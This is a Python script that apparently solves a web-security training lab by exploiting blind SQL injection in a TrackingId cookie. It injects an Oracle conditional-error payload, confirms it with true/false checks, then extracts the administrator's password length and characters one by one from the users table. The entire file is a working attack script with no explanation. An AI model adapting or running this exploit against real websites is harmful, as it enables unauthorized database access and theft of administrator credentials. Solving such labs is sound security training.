import requests
import string

LAB_URL = "https://0a1300b504ac0645800d08f0005800fc.web-security-academy.net/filter?category=Food+%26+Drink"


session = requests.Session()

session.get(LAB_URL)
real_tracking_id = session.cookies.get("TrackingId")
print("Got real TrackingId:", real_tracking_id)

def is_true(condition: str) -> bool:
    payload = f"{real_tracking_id}'||(SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    session.cookies.set("TrackingId", payload)
    resp = session.get(LAB_URL)
    return resp.status_code == 500

# Sanity check
print("Sanity check (should be True/error):", is_true("1=1"))
print("Sanity check (should be False/no error):", is_true("1=2"))

# Find password length
length = 0
for i in range(1, 50):
    if is_true(f"(SELECT LENGTH(password) FROM users WHERE username='administrator')={i}"):
        length = i
        print(f"Password length: {length}")
        break

# Extract password
password = ""
charset = string.ascii_lowercase + string.digits
for position in range(1, length + 1):
    for char in charset:
        condition = f"SUBSTR((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}'"
        if is_true(condition):
            password += char
            print(f"Progress: {password}")
            break

print("Final password:", password)